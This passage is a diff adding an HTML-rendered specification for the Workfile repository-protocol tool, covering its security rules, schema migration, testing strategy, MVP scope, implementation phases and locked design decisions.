+listing them reads them grouped: <code>project_card_list</code>, <code>project_card_claim</code>,
+<code>project_doc_create</code>, <code>project_memory_add</code>. Operations that answer for any
+record type drop the module: <code>project_search</code>, <code>project_next</code>,
+<code>project_get_record</code>, <code>project_workspace</code>, <code>project_doctor</code>.</p>
+<p>Rules:</p>
+<ul>
+<li>all writes use the same validation and concurrency behavior as CLI;</li>
+<li>tools return stable machine-readable errors;</li>
+<li>mutating tools report changed files;</li>
+<li>tool descriptions include protocol semantics, especially <code>review</code> versus <code>done</code>;</li>
+<li>the server may expose MCP over stdio first; network transports are optional later.</li>
+</ul>
+<h2 id="24-security-and-safety"><a class="hash" href="#24-security-and-safety" aria-hidden="true" tabindex="-1">##</a> 24. Security and safety</h2>
+<h3 id="241-path-safety"><a class="hash" href="#241-path-safety" aria-hidden="true" tabindex="-1">###</a> 24.1 Path safety</h3>
+<ul>
+<li>all local paths are normalized and checked against workspace boundaries;</li>
+<li>symlink escapes are rejected for writes;</li>
+<li>asset and document routes reject traversal;</li>
+<li>external read-only sources require explicit configuration;</li>
+<li>arbitrary file serving is prohibited.</li>
+</ul>
+<h3 id="242-local-server"><a class="hash" href="#242-local-server" aria-hidden="true" tabindex="-1">###</a> 24.2 Local server</h3>
+<ul>
+<li>loopback binding is default and recommended;</li>
+<li>non-loopback binding requires an explicit flag and warning;</li>
+<li>no authentication is required for loopback MVP;</li>
+<li>remote binding requires authentication before being considered supported.</li>
+</ul>
+<h3 id="243-content-safety"><a class="hash" href="#243-content-safety" aria-hidden="true" tabindex="-1">###</a> 24.3 Content safety</h3>
+<ul>
+<li>Markdown rendering sanitizes unsafe HTML;</li>
+<li>external links are clearly marked and opened safely;</li>
+<li><code>vscode://</code> or editor links are opt-in/configurable;</li>
+<li>uploaded filenames and MIME handling are defensive;</li>
+<li>executable attachments are not launched by the server.</li>
+</ul>
+<h3 id="244-sensitive-data"><a class="hash" href="#244-sensitive-data" aria-hidden="true" tabindex="-1">###</a> 24.4 Sensitive data</h3>
+<p>The doctor SHOULD detect likely secrets in protocol records through optional integration with
+existing secret scanners. The protocol itself does not store credentials.</p>
+<h2 id="25-schema-versioning-and-migrations"><a class="hash" href="#25-schema-versioning-and-migrations" aria-hidden="true" tabindex="-1">##</a> 25. Schema versioning and migrations</h2>
+<h3 id="251-version-declaration"><a class="hash" href="#251-version-declaration" aria-hidden="true" tabindex="-1">###</a> 25.1 Version declaration</h3>
+<p><code>project.config.mjs</code> and <code>.project/VERSION</code> declare the schema version. A mismatch is an
+error requiring reconciliation.</p>
+<p>Example <code>.project/VERSION</code>:</p>
+<pre class="code" data-lang="json"><code>{
+    &quot;schemaVersion&quot;: 2,
+    &quot;createdWith&quot;: &quot;@illodev/workfile@2.0.0&quot;,
+    &quot;migratedAt&quot;: &quot;2026-07-28T10:00:00Z&quot;
+}</code></pre>
+<h3 id="252-compatibility"><a class="hash" href="#252-compatibility" aria-hidden="true" tabindex="-1">###</a> 25.2 Compatibility</h3>
+<ul>
+<li>patch package releases do not change canonical schema;</li>
+<li>minor package releases may add optional backward-compatible fields or commands;</li>
+<li>schema-breaking changes require a new schema version and migration;</li>
+<li>newer unsupported schema versions are opened read-only where possible;</li>
+<li>unknown compatible fields are preserved.</li>
+</ul>
+<h3 id="253-migration-behavior"><a class="hash" href="#253-migration-behavior" aria-hidden="true" tabindex="-1">###</a> 25.3 Migration behavior</h3>
+<pre class="code" data-lang="bash"><code>workfile migrate plan
+workfile migrate apply</code></pre>
+<p>Migrations:</p>
+<ol>
+<li>inspect current state;</li>
+<li>produce a human-readable plan;</li>
+<li>create a Git-friendly backup or require a clean worktree;</li>
+<li>apply deterministic file changes;</li>
+<li>run the doctor;</li>
+<li>report every changed path;</li>
+<li>update version metadata only after successful validation.</li>
+</ol>
+<p>No migration deletes historical records by default.</p>
+<h2 id="26-migration-from-unified-backlog-system-v1"><a class="hash" href="#26-migration-from-unified-backlog-system-v1" aria-hidden="true" tabindex="-1">##</a> 26. Migration from Unified Backlog System v1</h2>
+<p>The existing implementation is treated as a supported legacy source.</p>
+<h3 id="261-legacy-layout"><a class="hash" href="#261-legacy-layout" aria-hidden="true" tabindex="-1">###</a> 26.1 Legacy layout</h3>
+<pre class="code" data-lang="text"><code>.planning/backlog/
+├── tasks/
+├── archive/
+├── assets/
+├── board/
+└── SPEC.md
+
+.planning/changelog/
+.planning/learnings/
+.planning/sources/</code></pre>
+<h3 id="262-migration-mapping"><a class="hash" href="#262-migration-mapping" aria-hidden="true" tabindex="-1">###</a> 26.2 Migration mapping</h3>
+<div class="table"><table>
+<thead>
+<tr>
+<th>v1</th>
+<th>v2</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>.planning/backlog/tasks/</code></td>
+<td><code>.project/cards/</code></td>
+</tr>
+<tr>
+<td><code>.planning/backlog/archive/</code></td>
+<td><code>.project/cards/archive/</code></td>
+</tr>
+<tr>
+<td><code>.planning/backlog/assets/</code></td>
+<td><code>.project/assets/</code></td>
+</tr>
+<tr>
+<td><code>.planning/changelog/</code></td>
+<td><code>.project/changelog/</code> or configured source</td>
+</tr>
+<tr>
+<td><code>.planning/learnings/</code></td>
+<td><code>.project/memory/learnings/</code></td>
+</tr>
+<tr>
+<td><code>.planning/sources/</code></td>
+<td><code>.project/sources/</code></td>
+</tr>
+<tr>
+<td>v1 board source</td>
+<td>installed npm package; removed after verification</td>
+</tr>
+<tr>
+<td>fixed Fube areas</td>
+<td>configured <code>cards.areas</code></td>
+</tr>
+</tbody></table></div>
+<h3 id="263-compatibility-first-approach"><a class="hash" href="#263-compatibility-first-approach" aria-hidden="true" tabindex="-1">###</a> 26.3 Compatibility-first approach</h3>
+<p>The migrator SHOULD support two strategies:</p>
+<h4 id="in-place-compatibility"><a class="hash" href="#in-place-compatibility" aria-hidden="true" tabindex="-1">####</a> In-place compatibility</h4>
+<p>Keep existing paths and generate configuration pointing to them. This minimizes the first
+diff and allows the package architecture to be validated before moving data.</p>
+<h4 id="canonical-relocation"><a class="hash" href="#canonical-relocation" aria-hidden="true" tabindex="-1">####</a> Canonical relocation</h4>
+<p>Move records to <code>.project/</code> with Git-aware renames and rewrite affected relative links.</p>
+<p>The default recommendation is:</p>
+<ol>
+<li>install the package;</li>
+<li>use existing v1 paths through config;</li>
+<li>validate feature parity;</li>
+<li>relocate records in a later dedicated migration.</li>
+</ol>
+<h3 id="264-code-extraction-plan"><a class="hash" href="#264-code-extraction-plan" aria-hidden="true" tabindex="-1">###</a> 26.4 Code extraction plan</h3>
+<p>The existing implementation should be transformed in this order:</p>
+<ol>
+<li>move parser, serializer and diagnostic logic into <code>src/core</code>;</li>
+<li>introduce <code>loadWorkspace()</code> and configuration-driven paths;</li>
+<li>replace server-relative constants with workspace services;</li>
+<li>move all canonical writes behind repositories and atomic filesystem operations;</li>
+<li>add runtime schema endpoint;</li>
+<li>remove project-specific enums from the UI bundle;</li>
+<li>package prebuilt UI assets;</li>
+<li>generalize Knowledge into configured Docs, History and Memory collections;</li>
+<li>add CLI initialization and migrations;</li>
+<li>generate agent instructions;</li>
+<li>add MCP only after core contracts stabilize.</li>
+</ol>
+<h3 id="265-required-parity-before-deleting-v1-board-code"><a class="hash" href="#265-required-parity-before-deleting-v1-board-code" aria-hidden="true" tabindex="-1">###</a> 26.5 Required parity before deleting v1 board code</h3>
+<ul>
+<li>all existing cards load without semantic change;</li>
+<li>parser round-trip tests remain byte-stable;</li>
+<li>create, patch, bulk patch, claim, archive and asset upload work;</li>
+<li>Explorer, Triage, Flow, Epics, Timeline and Health remain functional;</li>
+<li>changelogs and learnings remain discoverable;</li>
+<li>existing URLs have an equivalent or redirect where practical;</li>
+<li>doctor output is equal or stricter with documented changes;</li>
+<li>no v1 source directory is deleted automatically.</li>
+</ul>
+<h2 id="27-extensibility"><a class="hash" href="#27-extensibility" aria-hidden="true" tabindex="-1">##</a> 27. Extensibility</h2>
+<h3 id="271-internal-module-contract"><a class="hash" href="#271-internal-module-contract" aria-hidden="true" tabindex="-1">###</a> 27.1 Internal module contract</h3>
+<pre class="code" data-lang="ts"><code>interface ProjectModule {
+    id: string;
+    version: number;
+    collections: CollectionDefinition[];
+    load(workspace: ProjectWorkspace): Promise&lt;ModuleRuntime&gt;;
+    doctorRules?: DoctorRule[];
+    routes?: RouteDefinition[];
+    cli?: CommandDefinition[];
+    ui?: UiModuleManifest;
+    agentInstructions?: InstructionFragment[];
+}</code></pre>
+<p>Version 2 uses this contract internally. Third-party npm modules are not a public stability
+promise until the contract has been validated by real modules.</p>
+<h3 id="272-namespacing"><a class="hash" href="#272-namespacing" aria-hidden="true" tabindex="-1">###</a> 27.2 Namespacing</h3>
+<p>Extensions use namespaced IDs and fields:</p>
+<pre class="code" data-lang="text"><code>acme/risk
+acme.compliance_level</code></pre>
+<p>Core serializers preserve them. Portable UI may display unknown fields generically.</p>
+<h3 id="273-external-adapters"><a class="hash" href="#273-external-adapters" aria-hidden="true" tabindex="-1">###</a> 27.3 External adapters</h3>
+<p>Adapters may connect GitHub, GitLab, Jira, Linear, Slack or deployment systems. They MUST
+state which side is authoritative and how conflicts are resolved.</p>
+<p>No adapter may silently convert the repository into a non-authoritative cache.</p>
+<h2 id="28-performance-requirements"><a class="hash" href="#28-performance-requirements" aria-hidden="true" tabindex="-1">##</a> 28. Performance requirements</h2>
+<p>The MVP target workspace contains:</p>
+<ul>
+<li>10,000 cards;</li>
+<li>10,000 documentation and memory records combined;</li>
+<li>5,000 changelog fragments and releases;</li>
+<li>ordinary Markdown bodies up to 1 MB;</li>
+<li>assets excluded from full-text indexing unless supported.</li>
+</ul>
+<p>Targets on a typical developer machine after warm index:</p>
+<ul>
+<li>initial UI metadata response under 1 second for 10,000 cards;</li>
+<li>common filtered search under 150 ms;</li>
+<li>single-record mutation under 250 ms excluding filesystem contention;</li>
+<li>incremental reindex of one changed Markdown file under 200 ms;</li>
+<li>UI remains responsive through virtualization or incremental rendering.</li>
+</ul>
+<p>Cold scans may exceed these targets but SHOULD stream progress and cache results.</p>
+<h2 id="29-testing-strategy"><a class="hash" href="#29-testing-strategy" aria-hidden="true" tabindex="-1">##</a> 29. Testing strategy</h2>
+<h3 id="291-core-tests"><a class="hash" href="#291-core-tests" aria-hidden="true" tabindex="-1">###</a> 29.1 Core tests</h3>
+<ul>
+<li>parser and serializer inverse properties;</li>
+<li>unknown-field preservation;</li>
+<li>ID allocation under concurrent requests;</li>
+<li>atomic write recovery;</li>
+<li>path traversal and symlink escapes;</li>
+<li>hierarchy and relationship validation;</li>
+<li>migration fixtures;</li>
+<li>schema compatibility fixtures;</li>
+<li>module repository behavior.</li>
+</ul>
+<h3 id="292-cli-tests"><a class="hash" href="#292-cli-tests" aria-hidden="true" tabindex="-1">###</a> 29.2 CLI tests</h3>
+<ul>
+<li>workspace discovery;</li>
+<li>non-interactive JSON mode;</li>
+<li>initializer merge safety;</li>
+<li>exit codes;</li>
+<li>dirty worktree migration behavior;</li>
+<li>package-manager detection.</li>
+</ul>
+<h3 id="293-server-tests"><a class="hash" href="#293-server-tests" aria-hidden="true" tabindex="-1">###</a> 29.3 Server tests</h3>
+<ul>
+<li>versioned endpoints;</li>
+<li>conflict responses;</li>
+<li>static UI and asset serving;</li>
+<li>input size limits;</li>
+<li>Markdown sanitization;</li>
+<li>runtime schema delivery.</li>
+</ul>
+<h3 id="294-ui-tests"><a class="hash" href="#294-ui-tests" aria-hidden="true" tabindex="-1">###</a> 29.4 UI tests</h3>
+<ul>
+<li>large dataset navigation;</li>
+<li>filters and URL state;</li>
+<li>edit conflict recovery;</li>
+<li>unsaved-form protection on refresh;</li>
+<li>keyboard and accessibility flows;</li>
+<li>module-disabled states;</li>
+<li>relationship navigation.</li>
+</ul>
+<h3 id="295-golden-project-fixtures"><a class="hash" href="#295-golden-project-fixtures" aria-hidden="true" tabindex="-1">###</a> 29.5 Golden project fixtures</h3>
+<p>The repository SHOULD include fixtures for:</p>
+<ul>
+<li>empty project;</li>
+<li>cards-only project;</li>
+<li>full v2 project;</li>
+<li>legacy v1 project;</li>
+<li>corrupted project with expected doctor output;</li>
+<li>future-schema read-only project.</li>
+</ul>
+<h2 id="30-ci-integration"><a class="hash" href="#30-ci-integration" aria-hidden="true" tabindex="-1">##</a> 30. CI integration</h2>
+<p>Recommended workflow:</p>
+<pre class="code" data-lang="bash"><code>workfile doctor --new
+workfile agents check
+workfile changelog verify</code></pre>
+<p>Optional full validation on protected branches:</p>
+<pre class="code" data-lang="bash"><code>workfile doctor --severity warning
+workfile changelog verify
+workfile memory verify</code></pre>
+<p>CI MUST not require starting the UI.</p>
+<h2 id="31-observability"><a class="hash" href="#31-observability" aria-hidden="true" tabindex="-1">##</a> 31. Observability</h2>
+<p>The local server may emit structured debug logs when enabled:</p>
+<pre class="code" data-lang="text"><code>time, level, operation, module, recordId, durationMs, changedPaths</code></pre>
+<p>Default output remains quiet and human-readable. Telemetry is disabled by default.</p>
+<p>Doctor reports and migration plans are reproducible artifacts suitable for CI upload.</p>
+<h2 id="32-mvp-definition"><a class="hash" href="#32-mvp-definition" aria-hidden="true" tabindex="-1">##</a> 32. MVP definition</h2>
+<p>Version 2 MVP is complete when all of the following are true:</p>
+<h3 id="core-and-configuration"><a class="hash" href="#core-and-configuration" aria-hidden="true" tabindex="-1">###</a> Core and configuration</h3>
+<ul>
+<li>one npm package exposes the CLI and programmatic core;</li>
+<li>workspace discovery and <code>project.config.mjs</code> work;</li>
+<li>schema versioning and <code>.project/VERSION</code> work;</li>
+<li>all paths are configuration-driven;</li>
+<li>writes are atomic and preserve unknown fields.</li>
+</ul>
+<h3 id="work"><a class="hash" href="#work" aria-hidden="true" tabindex="-1">###</a> Work</h3>
+<ul>
+<li>feature parity with the existing card system;</li>
+<li>runtime-configured areas;</li>
+<li>atomic claim and transition commands;</li>
+<li>cards remain readable and editable as Markdown.</li>
+</ul>
+<h3 id="docs"><a class="hash" href="#docs" aria-hidden="true" tabindex="-1">###</a> Docs</h3>
+<ul>
+<li>configured Markdown sources are indexed and searchable;</li>
+<li>managed documents can be created through core/CLI;</li>
+<li>UI can browse and render documents with backlinks.</li>
+</ul>
+<h3 id="history"><a class="hash" href="#history" aria-hidden="true" tabindex="-1">###</a> History</h3>
+<ul>
+<li>changelog fragments can be created, browsed and validated;</li>
+<li>release records can consume fragments;</li>
+<li>generated changelog preview is available.</li>
+</ul>
+<h3 id="memory"><a class="hash" href="#memory" aria-hidden="true" tabindex="-1">###</a> Memory</h3>
+<ul>
+<li>learning, decision, incident, convention and context records load;</li>
+<li>records can be created through core/CLI;</li>
+<li>supersession, expiry and relationships are validated;</li>
+<li>UI can browse and search all collections.</li>
+</ul>
+<h3 id="system"><a class="hash" href="#system" aria-hidden="true" tabindex="-1">###</a> System</h3>
+<ul>
+<li>unified search works across modules;</li>
+<li>Health renders shared doctor results;</li>
+<li>initializer and v1 compatibility migration exist;</li>
+<li>canonical agent instructions and at least <code>AGENTS.md</code> adapter exist;</li>
+<li>CI commands work without UI dependencies.</li>
+</ul>
+<p>MCP, semantic search, remote adapters and public plugins are not required for MVP.</p>
+<h2 id="33-implementation-phases"><a class="hash" href="#33-implementation-phases" aria-hidden="true" tabindex="-1">##</a> 33. Implementation phases</h2>
+<h3 id="phase-0--lock-contracts"><a class="hash" href="#phase-0--lock-contracts" aria-hidden="true" tabindex="-1">###</a> Phase 0 — Lock contracts</h3>
+<ul>
+<li>approve this spec;</li>
+<li>choose final project/package name;</li>
+<li>settle default paths and config shape;</li>
+<li>add golden fixtures from the existing v1 implementation.</li>
+</ul>
+<h3 id="phase-1--core-extraction"><a class="hash" href="#phase-1--core-extraction" aria-hidden="true" tabindex="-1">###</a> Phase 1 — Core extraction</h3>
+<ul>
+<li>create package skeleton;</li>
+<li>extract parser, serializer, loader and doctor;</li>
+<li>add workspace/config services;</li>
+<li>implement atomic writes and revision tokens;</li>
+<li>keep current UI temporarily connected through a compatibility server.</li>
+</ul>
+<h3 id="phase-2--portable-work-module"><a class="hash" href="#phase-2--portable-work-module" aria-hidden="true" tabindex="-1">###</a> Phase 2 — Portable Work module</h3>
+<ul>
+<li>configuration-driven areas and paths;</li>
+<li>CLI card operations;</li>
+<li>runtime schema endpoint;</li>
+<li>precompiled UI package;</li>
+<li>v1 compatibility configuration;</li>
+<li>parity tests.</li>
+</ul>
+<h3 id="phase-3--docs-and-unified-index"><a class="hash" href="#phase-3--docs-and-unified-index" aria-hidden="true" tabindex="-1">###</a> Phase 3 — Docs and unified index</h3>
+<ul>
+<li>glob discovery;</li>
+<li>common record index and search;</li>
+<li>Docs UI;</li>
+<li>backlinks and freshness checks;</li>
+<li>managed document CLI.</li>
+</ul>
+<h3 id="phase-4--history-and-memory"><a class="hash" href="#phase-4--history-and-memory" aria-hidden="true" tabindex="-1">###</a> Phase 4 — History and Memory</h3>
+<ul>
+<li>changelog fragments and releases;</li>
+<li>memory collection schemas;</li>
+<li>History and Memory UI;</li>
+<li>graduation, supersession and expiry checks.</li>
+</ul>
+<h3 id="phase-5--initialization-and-agents"><a class="hash" href="#phase-5--initialization-and-agents" aria-hidden="true" tabindex="-1">###</a> Phase 5 — Initialization and agents</h3>
+<ul>
+<li>interactive/non-interactive initializer;</li>
+<li>agent protocol generator;</li>
+<li>adapters for selected environments;</li>
+<li>CI templates;</li>
+<li>migration plan/apply commands.</li>
+</ul>
+<h3 id="phase-6--integrations"><a class="hash" href="#phase-6--integrations" aria-hidden="true" tabindex="-1">###</a> Phase 6 — Integrations</h3>
+<ul>
+<li>MCP server;</li>
+<li>semantic search option;</li>
+<li>external tracker and deployment adapters;</li>
+<li>evaluate public plugin API.</li>
+</ul>
+<h2 id="34-phase-0-decisions"><a class="hash" href="#34-phase-0-decisions" aria-hidden="true" tabindex="-1">##</a> 34. Phase 0 decisions</h2>
+<p>The following decisions are locked for the v2 implementation. Changes require a dated
+amendment and, when they affect canonical files, an explicit schema compatibility analysis.</p>
+<ol>
+<li><strong>Product and CLI</strong> — the technical product name is <strong>Workfile</strong>; the formal
+standard remains <strong>Repository Workfile</strong>. The executable is <code>workfile</code>.</li>
+<li><strong>Default root</strong> — canonical managed data uses <code>.project/</code>. Every path remains
+configurable to support compatibility and specialized repositories.</li>
+<li><strong>Package scope</strong> — the initial package is <code>@illodev/workfile</code>. The package is internally
+modular but ships as one release unit through the v2 MVP.</li>
+<li><strong>Canonical language</strong> — the whole protocol surface is English: normative
+specifications, field names, enum values, diagnostic codes, machine contracts, UI
+labels, generated instructions and record bodies. Localization was offered through
+<code>config.language</code> until 0.6.x and removed in ADR-0012; the key is accepted and
+ignored so existing configurations keep loading.</li>
+<li><strong>Card statuses</strong> — the existing eight statuses are fixed protocol semantics in schema v2.
+Projects may hide statuses from selected views but may not remove or redefine them.</li>
+<li><strong>Managed Docs UI</strong> — indexed and managed documents are read-only in the MVP UI. Managed
+documents can be created and updated through core and CLI. In-UI document editing is
+deferred until conflict handling has proven stable on cards.</li>
+<li><strong>Release model</strong> — release identifiers are project-configurable. Semver is the default;
+calendar/date releases are supported. The selected strategy is declared in configuration
+and may not be inferred differently by CLI, UI and CI.</li>
+<li><strong>ID allocation</strong> — MVP allocation scans active and archived IDs, proposes the next
+sequence and exclusively creates a transient ID reservation under the disposable cache
+before writing the slugged record file. A collision causes a bounded retry with the next
+sequence. No canonical counter file is introduced in schema v2. Stale reservations are
+diagnosable and recoverable.</li>
+<li><strong>Derived index</strong> — Phase 1 starts with an in-memory index behind an <code>IndexStore</code> contract.
+The MVP persistent implementation is disposable SQLite under <code>.project/.cache/</code>. Canonical
+behavior must not depend on SQLite being present or intact.</li>
+<li><strong>Agent instruction ownership</strong> — <code>.project/agents/protocol.md</code> and workflow files are the
+canonical instruction source. Root/editor files contain generated, replaceable managed
+blocks and may also contain unrelated human-maintained instructions.</li>
+<li><strong>v1 migration</strong> — compatibility-path adoption is the default. Canonical relocation to
+<code>.project/</code> is a separate explicit migration after functional parity is verified.</li>
+<li><strong>Publication</strong> — development begins as a private package. Publication and license are
+product-governance decisions and do not block or alter the v2 technical contracts.</li>
+</ol>
+<h3 id="341-phase-0-acceptance-criteria"><a class="hash" href="#341-phase-0-acceptance-criteria" aria-hidden="true" tabindex="-1">###</a> 34.1 Phase 0 acceptance criteria</h3>
+<p>Phase 0 is complete when:</p>
+<ul>
+<li>this RC is accepted as the implementation contract;</li>
+<li>the legacy v1 implementation is preserved as a golden fixture;</li>
+<li>default configuration and effective schema fixtures exist;</li>
+<li>parser round-trip and doctor parity tests run outside the legacy board directory;</li>
+<li>Phase 1 code no longer imports paths or enums from the Fube repository layout.</li>
+</ul>
+<h2 id="35-locked-implementation-defaults"><a class="hash" href="#35-locked-implementation-defaults" aria-hidden="true" tabindex="-1">##</a> 35. Locked implementation defaults</h2>
+<p>Unless amended, implementations use these defaults:</p>
+<pre class="code" data-lang="text"><code>Product:             Workfile
+Package:             @illodev/workfile
+CLI:                 project
+Schema:              2
+Root:                .project/
+Config:              project.config.mjs
+Canonical language:  English, with no localized surface
+Index:               in-memory first; disposable SQLite for MVP
+Migration:           compatibility paths first
+Instructions:        .project/agents/protocol.md is canonical</code></pre>
+<p>The following original design recommendations remain in force:</p>
+<ol>
+<li>One npm package for the v2 MVP, with internal boundaries suitable for later extraction.</li>
+<li>Markdown as canonical storage and a disposable local index.</li>
+<li>Project-specific areas are supplied at runtime by configuration.</li>
+<li>Docs index existing files and manage optional protocol-owned documents.</li>
+<li>Changelog uses atomic fragments plus release records.</li>
+<li>Memory is split into learnings, decisions, incidents, conventions and expiring context.</li>
+<li>CLI/core operations are authoritative; prompts only explain how to invoke them.</li>
+<li>MCP is built after the core API stabilizes.</li>
+<li>The local UI remains one precompiled application served by the package.</li>
+</ol>
+<h2 id="36-phase-6-integration-decisions"><a class="hash" href="#36-phase-6-integration-decisions" aria-hidden="true" tabindex="-1">##</a> 36. Phase 6 integration decisions</h2>
+<ol>
+<li><strong>MCP transport</strong> — schema-v2 ships a local stdio server. Messages are UTF-8,
+newline-delimited JSON-RPC. Streamable HTTP is deferred until authentication, Origin
+validation and deployment-specific authorization have a concrete remote-use case.</li>
+<li><strong>Protocol revisions</strong> — the server is dual-era. Modern requests implement revision
+<code>2026-07-28</code> with per-request metadata, <code>server/discover</code>, stateless operation,
+<code>resultType</code> and cache metadata. Legacy clients may negotiate <code>2025-11-25</code> and the
+implementation&#39;s declared earlier revisions through <code>initialize</code>.</li>
+<li><strong>Shared domain core</strong> — MCP tools call the same core mutations as CLI and HTTP. No MCP
+handler may write canonical files directly.</li>
+<li><strong>Safety mode</strong> — MCP can be started read-only. Mutating tools are omitted from discovery
+and direct mutation calls fail with a stable protocol result.</li>
+<li><strong>Resources and prompts</strong> — canonical records are readable through <code>project://</code> resources.
+Start-work, finish-work and record-knowledge prompts are protocol adapters, not separate
+sources of project truth.</li>
+<li><strong>Semantic search</strong> — lexical search remains the built-in deterministic default. Semantic
+ranking is accepted only through an explicitly injected provider. The package never sends
+repository content to a network service by itself.</li>
+<li><strong>Integration API</strong> — the 0.6 integration registry is experimental and limited to approved
+semantic search and health adapters. It must mature from real usage before becoming a
+general plugin ABI.</li>
+<li><strong>Vendor adapters</strong> — issue tracker and deployment-provider adapters are deferred. Their
+credentials, remote identity and synchronization semantics are not canonical schema-v2
+concerns.</li>
+<li><strong>Publication governance</strong> — technical packaging is prepared, but the package remains
+<code>private: true</code> and <code>UNLICENSED</code> until the owner makes the publication and license decision
+recorded as open in Phase 0.</li>
+</ol>
+<h2 id="37-amendment-log"><a class="hash" href="#37-amendment-log" aria-hidden="true" tabindex="-1">##</a> 37. Amendment log</h2>
+<ul>
+<li><strong>2026-07-28 RC2</strong> — Locked the dual-era local MCP stdio contract (<code>2026-07-28</code> modern
+semantics plus legacy initialization compatibility), explicit read-only behavior,
+host-injected semantic search and the intentionally narrow experimental integration API.</li>
+<li><strong>2026-07-28 RC1</strong> — Locked Phase 0 technical contracts: product/package names, <code>.project/</code>
+root, fixed statuses, read-only Docs MVP UI, release strategy, collision-safe transient ID reservation,
+staged index implementation, canonical agent instructions and compatibility-first migration.</li>
+<li><strong>2026-07-28 DRAFT</strong> — Initial v2 draft derived from Unified Backlog System v1 and expanded
+into a portable repository operating protocol covering Work, Docs, History and Memory.</li>
+</ul>
+</article>
+<p class="source">Generated from <a href="https://github.com/illodev/workfile/blob/main/packages/workfile/docs/SPEC.md">packages/workfile/docs/SPEC.md</a>.</p>
+</main>
+</div>
+<footer class="foot"><div class="foot-in"><span>MIT © illodev — the repository is the database</span><a href="/">home</a><a href="/llms.txt">llms.txt</a><a href="https://github.com/illodev/workfile">github</a><a href="https://www.npmjs.com/package/@illodev/workfile">npm</a></div></footer>
+</body>
+</html>
